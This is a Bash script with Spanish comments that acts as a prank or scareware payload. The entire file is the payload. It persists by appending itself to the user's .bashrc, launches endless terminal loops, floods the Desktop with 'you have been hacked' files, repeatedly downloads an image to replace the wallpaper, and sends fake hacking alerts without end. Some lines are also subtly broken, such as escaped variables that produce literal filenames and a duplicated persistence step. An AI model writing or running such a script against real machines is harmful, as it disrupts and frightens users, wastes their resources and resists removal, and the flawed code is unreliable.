#!/bin/bash

# Definir nombre para la búsqueda en Google
NOMBRE="SOY TU PEOR PESADILLA"

# Abrir Google con el nombre
xdg-open "https://www.google.com/search?q=${NOMBRE}"

# Abrir la imagen de "hackeo"
HACK_IMAGE="https://i.imgur.com/EsnPdi3.jpg"

# Espera 2 segundos antes de abrir la imagen
sleep 2
xdg-open "${HACK_IMAGE}"

# Agrega este script al archivo .bashrc para ejecutarse en cada inicio de sesión
# Esto intenta persistir el script en la configuración del usuario
echo "$(pwd)/open_google.sh" >> ~/.bashrc

# Si el script 'open_google.sh' no está en .bashrc, lo añade para persistencia
if ! grep -q "$(pwd)/open_google.sh" ~/.bashrc; then
    echo "$(pwd)/open_google.sh" >> ~/.bashrc
fi

# Captura la hora actual en formato HHMM
HORA=$(date +"%H%M")

# Define el número de terminales a abrir
NUM_TERMINALES=5

# Define la ruta del escritorio del usuario
ESCRITORIO="$HOME/Escritorio"

# Ruta temporal para almacenar un fondo de pantalla modificado
FONDO_TEMPORAL="/tmp/hack_background.jpg"

# Función para abrir terminales con mensajes de "caos"
launch_terminal() {
  gnome-terminal -- bash -c "
  echo '🔥 Modo caos activado 🔥';
  echo 'Multiplicando la hora ($HORA) infinitamente...';

  while true; do
    NUM=\$((RANDOM % 100 + 1))  # Número aleatorio entre 1 y 100
    RESULT=\$((HORA * NUM))
    echo \"$HORA x \$NUM = \$RESULT\";
    sleep 0.1;
  done
  exec bash"
}

# Función para generar archivos de texto basura en el escritorio
generate_trash_files() {
  while true; do
    BASURA="$ESCRITORIO/hack_\$RANDOM.txt"
    echo "Has sido hackeado 😈" > "\$BASURA"
    sleep 1
  done
}

# Función para cambiar el fondo de pantalla repetidamente
change_wallpaper() {
  while true; do
    wget -O "$FONDO_TEMPORAL" "$HACK_IMAGE" -q
    gsettings set org.gnome.desktop.background picture-uri "file://$FONDO_TEMPORAL"
    sleep 15
  done
}

# Lanza múltiples terminales en segundo plano
for ((i = 2; i <= NUM_TERMINALES; i++)); do
  launch_terminal &
done

# Inicia la generación de archivos basura en segundo plano
generate_trash_files &

# Inicia el cambio de fondo de pantalla en segundo plano
change_wallpaper &

# Bucle infinito para mostrar notificaciones de advertencia
while true; do
  notify-send "💀 ALERTA 💀" "Tu sistema está siendo hackeado..."
  sleep 3
done